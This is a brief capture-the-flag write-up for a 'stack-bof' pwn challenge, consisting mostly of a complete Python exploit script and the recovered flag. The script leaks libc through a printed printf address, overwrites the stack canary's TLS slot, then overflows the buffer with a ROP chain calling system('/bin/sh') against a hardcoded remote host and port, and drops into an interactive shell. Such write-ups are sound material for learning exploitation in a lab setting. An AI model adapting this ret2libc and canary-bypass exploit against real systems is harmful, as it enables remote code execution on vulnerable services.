---
created: 2026-03-14T22:55
updated: 2026-03-15T01:14
points: 142
solves: 45
---

My teammate got RCE but couldn't figure out how to get the flag.

Well it was just `cd /` `ls` and `cat flag.txt`

```bash
$ cat /flag*
tkbctf{*** stack smashing not detected ***}
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1773543386/20260314225625820.png/34c9ab94ee4b388e774ac555c4c402f8.png)

```flag
tkbctf{*** stack smashing not detected ***}
```

His script:

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import time

# Remote target defaults
DEFAULT_HOST = "35.194.108.145"
DEFAULT_PORT = 26639

# Ubuntu 24.04 libc (2.39) offsets
PRINTF_OFF = 0x60100
SYSTEM_OFF = 0x58750
BINSH_OFF = 0x1CB42F
POP_RDI_RET_OFF = 0x10F78B
RET_OFF = 0x2A875

# Known relation from leak to TLS canary slot on this challenge infra.
KNOWN_DELTA = -0x629C0
CANARY = 0x4242424242424200

def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)

def recv_until(sock: socket.socket, token: bytes, timeout: float = 2.0) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    while token not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf

def recv_some(sock: socket.socket, timeout: float = 0.25) -> bytes:
    sock.settimeout(timeout)
    out = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass
    return out

def exploit(host: str, port: int, delta: int) -> socket.socket:
    s = socket.create_connection((host, port), timeout=5.0)
    banner = recv_until(s, b"\n", timeout=3.0).decode("latin-1", "ignore")
    m = re.search(r"printf:\s*(0x[0-9a-fA-F]+)", banner)
    if not m:
        raise RuntimeError(f"failed to parse banner: {banner!r}")

    printf_addr = int(m.group(1), 16)
    libc_base = printf_addr - PRINTF_OFF

    canary_slot = printf_addr + delta + 0x28
    system = libc_base + SYSTEM_OFF
    binsh = libc_base + BINSH_OFF
    pop_rdi_ret = libc_base + POP_RDI_RET_OFF
    ret = libc_base + RET_OFF

    # buf[8] + canary + saved rbp + ROP
    rop = b"A" * 8
    rop += p64(CANARY)
    rop += b"B" * 8
    rop += p64(ret)
    rop += p64(pop_rdi_ret)
    rop += p64(binsh)
    rop += p64(system)

    # 1) arbitrary 8-byte write to canary slot, 2) gets overflow into ROP
    payload = p64(canary_slot) + p64(CANARY) + rop + b"\n"
    s.sendall(payload)
    return s

def interactive(sock: socket.socket) -> None:
    print("[+] Interactive mode (type 'exit' to quit)")
    while True:
        try:
            cmd = input("$ ")
        except EOFError:
            break
        if not cmd:
            continue
        sock.sendall(cmd.encode() + b"\n")
        time.sleep(0.08)
        out = recv_some(sock)
        if out:
            print(out.decode("latin-1", "ignore"), end="")
        if cmd.strip() == "exit":
            break

def main() -> int:
    parser = argparse.ArgumentParser(
        description="RCE exploit driver for stack-bof")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--delta", type=lambda x: int(x, 0),
                        default=KNOWN_DELTA)
    parser.add_argument("--cmd", default="id")
    parser.add_argument("--interactive", action="store_true")
    args = parser.parse_args()

    sock = exploit(args.host, args.port, args.delta)
    print("[+] Shell obtained")

    interactive(sock)

    sock.close()
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
# tkbctf{*** stack smashing not detected ***}
```
